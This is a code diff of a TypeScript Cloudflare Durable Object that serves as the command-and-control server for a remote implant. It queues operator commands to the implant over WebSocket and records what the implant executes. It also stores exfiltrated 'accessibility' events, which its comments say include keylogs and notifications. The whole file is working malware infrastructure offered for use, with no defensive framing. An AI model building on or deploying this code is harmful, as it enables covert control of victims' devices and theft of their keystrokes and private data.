@@ -1,46 +1,57 @@
-import { Env } from './index';
+import { DurableObject } from 'cloudflare:workers';
 
-// Represents an active connection session
-interface Session {
-  ws: WebSocket;
-  transportType: string;
-  connectedAt: number;
-  lastPing: number;
+interface Env {
+  STORAGE: R2Bucket;
+  FLEET_CONFIG: KVNamespace;
+  OPERATOR_PUBKEY: string;
 }
 
-export class ImplantDO {
-  private state: DurableObjectState;
-  private env: Env;
-  private sessions: Map<string, Session> = new Map();
+interface CommandResult {
+  id: string;
+  cmd: string;
+  data: string;
+  ts: number;
+}
+
+export class ImplantDO extends DurableObject {
+  private sessions: Map<string, { connectedAt: number; lastPing: number }>;
+  private lastHeartbeat: number = 0;
+  private implantInfo: any = null;
 
   constructor(state: DurableObjectState, env: Env) {
-    this.state = state;
-    this.env = env;
-    
-    // Initialize SQLite schema if needed (using DO's SQL API)
-    this.state.blockConcurrencyWhile(async () => {
-      this.state.storage.sql.exec(`
-        CREATE TABLE IF NOT EXISTS command_queue (
-          id TEXT PRIMARY KEY,
-          command TEXT NOT NULL,
-          payload BLOB,
-          status TEXT NOT NULL,
-          queued_at INTEGER NOT NULL
-        )
-      `);
-    });
+    super(state, env);
+    this.sessions = new Map();
+    this.state.storage.sql.exec(
+      `CREATE TABLE IF NOT EXISTS command_queue (
+        id TEXT PRIMARY KEY,
+        command TEXT NOT NULL,
+        payload TEXT,
+        status TEXT DEFAULT 'pending',
+        result TEXT,
+        queued_at INTEGER,
+        completed_at INTEGER
+      )`
+    );
+    this.state.storage.sql.exec(
+      `CREATE TABLE IF NOT EXISTS implant_events (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        type TEXT,
+        tag TEXT,
+        data TEXT,
+        ts INTEGER
+      )`
+    );
   }
 
   async fetch(request: Request): Promise<Response> {
     const url = new URL(request.url);
 
-    // 1. Handle WebSocket upgrade from Implant
+    // WebSocket upgrade from implant
     if (request.headers.get('Upgrade') === 'websocket') {
-      const transportType = url.pathname.split('/')[2]; // /t/wss/implantId -> wss
-      return this.handleWebSocketUpgrade(request, transportType);
+      return this.handleWebSocketUpgrade(request, url.pathname.split('/')[2] || 'wss');
     }
 
-    // 2. Handle internal RPC from Operator API
+    // RPC from the Worker (operator commands, result polling)
     if (url.pathname === '/rpc' && request.method === 'POST') {
       const body = await request.json();
       return this.handleOperatorRPC(body);
@@ -49,22 +60,18 @@ export class ImplantDO {
     return new Response('Not found', { status: 404 });
   }
 
-  private handleWebSocketUpgrade(request: Request, transportType: string): Response {
+  private handleWebSocketUpgrade(request: Request, _transportType: string): Response {
     const pair = new WebSocketPair();
-    const [client, server] = Object.values(pair);
+    const [client, server] = Object.values(pair) as [WebSocket, WebSocket];
 
-    // Accept the WebSocket connection using Hibernation API
-    this.state.acceptWebSocket(server, [transportType]);
-    
-    const sessionId = crypto.randomUUID();
-    this.sessions.set(sessionId, {
-      ws: server,
-      transportType,
+    this.state.acceptWebSocket(server, ['implant']);
+
+    this.sessions.set('primary', {
       connectedAt: Date.now(),
-      lastPing: Date.now()
+      lastPing: Date.now(),
     });
 
-    // Send queued commands upon connection
+    // Flush pending commands to the implant upon connection
     this.flushQueue(server);
 
     return new Response(null, {
@@ -75,75 +82,171 @@ export class ImplantDO {
 
   private handleOperatorRPC(body: any): Response {
     const { command, payload } = body;
-    const cmdId = crypto.randomUUID();
 
-    // Store in SQLite queue
-    this.state.storage.sql.exec(
-      `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, ?, ?)`,
-      cmdId, command, payload, 'pending', Date.now()
-    );
-
-    // If we have an active WebSocket, send immediately
-    let sent = false;
-    for (const ws of this.state.getWebSockets()) {
-      if (ws.readyState === WebSocket.OPEN) {
-        // Frame format: JSON
-        const frame = JSON.stringify({ id: cmdId, c: command, p: payload });
-        ws.send(frame);
-        sent = true;
-        
-        this.state.storage.sql.exec(`UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId);
-        break; // Send to primary session only for now
+    switch (command) {
+      case 'send_command': {
+        const cmdId = crypto.randomUUID();
+        this.state.storage.sql.exec(
+          `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, 'pending', ?)`,
+          cmdId, payload?.command || '', JSON.stringify(payload?.payload || {}), Date.now()
+        );
+        // Send to connected implant immediately
+        let sent = false;
+        for (const ws of this.state.getWebSockets()) {
+          if (ws.readyState === WebSocket.OPEN) {
+            const frame = JSON.stringify({
+              id: cmdId,
+              c: payload?.command,
+              p: payload?.payload || {},
+            });
+            ws.send(frame);
+            sent = true;
+            this.state.storage.sql.exec(
+              `UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId
+            );
+            break;
+          }
+        }
+        return new Response(JSON.stringify({ success: true, cmdId, sent }), {
+          headers: { 'Content-Type': 'application/json' },
+        });
       }
-    }
 
-    return new Response(JSON.stringify({ success: true, cmdId, sent }), {
-      headers: { 'Content-Type': 'application/json' }
-    });
+      case 'get_result': {
+        const { cmdId } = payload || {};
+        if (cmdId) {
+          const rows = this.state.storage.sql.exec(
+            `SELECT id, command, status, result, completed_at FROM command_queue WHERE id = ?`,
+            cmdId
+          ).toArray();
+          if (rows.length > 0) {
+            return new Response(JSON.stringify({
+              success: true,
+              result: {
+                id: rows[0].id,
+                status: rows[0].status,
+                data: rows[0].result,
+                completedAt: rows[0].completed_at,
+              }
+            }), {
+              headers: { 'Content-Type': 'application/json' },
+            });
+          }
+          return new Response(JSON.stringify({ success: true, result: null }), {
+            headers: { 'Content-Type': 'application/json' },
+          });
+        }
+        // Return all recent results
+        const results = this.state.storage.sql.exec(
+          `SELECT id, command, status, result, completed_at FROM command_queue
+           WHERE status = 'completed' ORDER BY completed_at DESC LIMIT 50`
+        ).toArray();
+        return new Response(JSON.stringify({ success: true, results }), {
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
+
+      case 'get_status': {
+        const connected = this.state.getWebSockets().length > 0;
+        return new Response(JSON.stringify({
+          success: true,
+          status: {
+            connected,
+            sessions: this.state.getWebSockets().length,
+            lastHeartbeat: this.lastHeartbeat,
+            implantInfo: this.implantInfo,
+            pendingCommands: this.state.storage.sql.exec(
+              `SELECT COUNT(*) as count FROM command_queue WHERE status IN ('pending','sent')`
+            ).toArray()[0]?.count || 0,
+          }
+        }), {
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
+
+      case 'get_events': {
+        const events = this.state.storage.sql.exec(
+          `SELECT * FROM implant_events ORDER BY ts DESC LIMIT 100`
+        ).toArray();
+        return new Response(JSON.stringify({ success: true, events }), {
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
+
+      default:
+        return new Response(JSON.stringify({ error: `Unknown command: ${command}` }), {
+          status: 400,
+          headers: { 'Content-Type': 'application/json' },
+        });
+    }
   }
 
   private flushQueue(ws: WebSocket) {
-    const pending = this.state.storage.sql.exec(`SELECT * FROM command_queue WHERE status = 'pending'`).toArray();
+    const pending = this.state.storage.sql.exec(
+      `SELECT id, command, payload FROM command_queue WHERE status = 'pending'`
+    ).toArray();
     for (const row of pending) {
-      const frame = JSON.stringify({ id: row.id, c: row.command, p: row.payload });
+      const frame = JSON.stringify({
+        id: row.id,
+        c: row.command,
+        p: JSON.parse(row.payload || '{}'),
+      });
       ws.send(frame);
-      this.state.storage.sql.exec(`UPDATE command_queue SET status = 'sent' WHERE id = ?`, row.id);
+      this.state.storage.sql.exec(
+        `UPDATE command_queue SET status = 'sent' WHERE id = ?`, row.id
+      );
     }
   }
 
   // --- WebSocket Hibernation Handlers ---
 
   async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) {
-    // Implant sent us a message (exfil, result, heartbeat)
-    // In full impl: Decrypt ChaCha20-Poly1305 frame here
     try {
-      const parsed = typeof message === 'string' ? JSON.parse(message) : JSON.parse(new TextDecoder().decode(message));
-      
+      const raw = typeof message === 'string' ? message : new TextDecoder().decode(message);
+      const parsed = JSON.parse(raw);
+
       if (parsed.type === 'heartbeat') {
-        // Update last ping
+        this.lastHeartbeat = parsed.ts || Date.now();
+        if (parsed.info) this.implantInfo = parsed.info;
+        this.sessions.set('primary', {
+          connectedAt: this.sessions.get('primary')?.connectedAt || Date.now(),
+          lastPing: Date.now(),
+        });
         return;
       }
-      
-      if (parsed.type === 'result') {
-        this.state.storage.sql.exec(`UPDATE command_queue SET status = 'completed' WHERE id = ?`, parsed.id);
-        // Forward result to Operator via KV/D1 or Push Notification
+
+      if (parsed.type === 'result' && parsed.id) {
+        // Implant executed a command — store the result
+        this.state.storage.sql.exec(
+          `UPDATE command_queue SET status = 'completed', result = ?, completed_at = ? WHERE id = ?`,
+          parsed.data || '', parsed.ts || Date.now(), parsed.id
+        );
+        return;
+      }
+
+      if (parsed.type === 'event') {
+        // A11y exfil event (keylog, notification, etc.)
+        this.state.storage.sql.exec(
+          `INSERT INTO implant_events (type, tag, data, ts) VALUES (?, ?, ?, ?)`,
+          parsed.type, parsed.tag || 'unknown', parsed.data || '', Date.now()
+        );
+        return;
+      }
+
+      if (parsed.type === 'handshake_response') {
+        this.implantInfo = { ...this.implantInfo, pub: parsed.pub };
+        return;
       }
     } catch (e) {
-      console.error("Invalid frame", e);
+      console.error('Invalid frame from implant:', e);
     }
   }
 
-  async webSocketClose(ws: WebSocket, code: number, reason: string, wasClean: boolean) {
-    // Clean up session
-    for (const [id, session] of this.sessions.entries()) {
-      if (session.ws === ws) {
+  async webSocketClose(ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
+    for (const [id] of this.sessions.entries()) {
+      if (ws === (await this.state.getWebSockets()).find(w => w === ws)) {
         this.sessions.delete(id);
-        break;
       }
     }
-  }
-
-  async webSocketError(ws: WebSocket, error: any) {
-    this.webSocketClose(ws, 1006, "Error", false);
   }
 }
